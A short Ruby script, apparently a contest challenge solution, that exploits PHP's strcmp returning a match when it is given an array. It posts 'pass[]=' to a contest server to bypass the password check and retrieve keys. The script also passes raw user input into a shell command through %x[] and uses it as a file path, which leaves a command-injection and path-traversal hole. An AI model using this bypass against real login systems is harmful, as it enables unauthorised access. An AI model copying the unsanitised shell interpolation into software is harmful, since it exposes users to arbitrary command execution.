#!/usr/bin/env ruby

# This program exploit a strcmp php vulnerability
#  (which returns 0 -equal- if comparing one string with an array)

# The url we are exploiting
URL = 'http://pauth.contest.tuenti.net/'

# The input is the key field
input_key = gets.chomp

# We cache on disk values for known keys
File.stat( input_key ) rescue File.open( input_key, 'a' ) do |file|
	# In case file does not exist, we post a malicious string to the url
	# The string contains the valid key and a fake path
	# (Note the 'pass[]=' --> we actually are sending an array of passwords, to exploit the issue)
	# Servers returns "bla bla bla your key: 2342348712309847", so we split and take the last!
	file.puts %x[ echo "key=#{input_key}&pass[]=" | POST #{URL} ].split(' ').last
end

# At this point, the file containing the computed value exists, so we output them
# (Reading a file just born is really fast on modern HDDs and OSs)
puts File.readlines( input_key ).first
